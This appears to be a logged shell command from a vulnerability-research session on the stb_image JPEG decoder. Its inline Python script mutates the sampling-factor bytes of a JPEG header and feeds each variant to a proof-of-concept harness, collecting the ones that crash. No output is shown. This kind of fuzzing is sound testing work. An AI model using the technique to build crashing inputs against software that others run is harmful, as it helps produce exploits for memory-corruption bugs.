Command `cd /workspace/repo-vul/src-vul/stb && grep -n "fractional" -n stb_image.h && sed -n '3748,3775p' stb_image.h && sed -n '3498,3512p' stb_image.h && python3 - <<'PY'
from pathlib import Path
from PIL import Image
import subprocess, itertools
img=Image.new('RGB',(8,8),(1,2,3))
img.save('/tmp/base.jpg','JPEG',subsampling=0,quality=90)
base=bytearray(Path('/tmp/base.jpg').read_bytes())
idx=base.find(b'\xff\xc0')
cs=idx+2+2+1+2+2+1
# search all sampling byte combos for second and third components with one component fixed at 0x11
vals=[0x11,0x12,0x13,0x14,0x21,0x22,0x23,0x24,0x31,0x32,0x33,0x34,0x41,0x42,0x43,0x44]
crashes=[]
for b,c in itertools.product(vals, repeat=2):
    data=bytearray(base)
    data[cs+4+1]=b
    data[cs+7+1]=c
    p='/tmp/t.jpg'
    Path(p).write_bytes(data)
    r=subprocess.run(['/tmp/jpeg_poc',p],capture_output=True,text=True)
    if r.returncode!=0 and 'ERROR:' in r.stderr:
        crashes.append((b,c,r.returncode,r.stderr.splitlines()[2:5]))
        if len(crashes)>=8:
            break
print('crash-like cases',crashes)
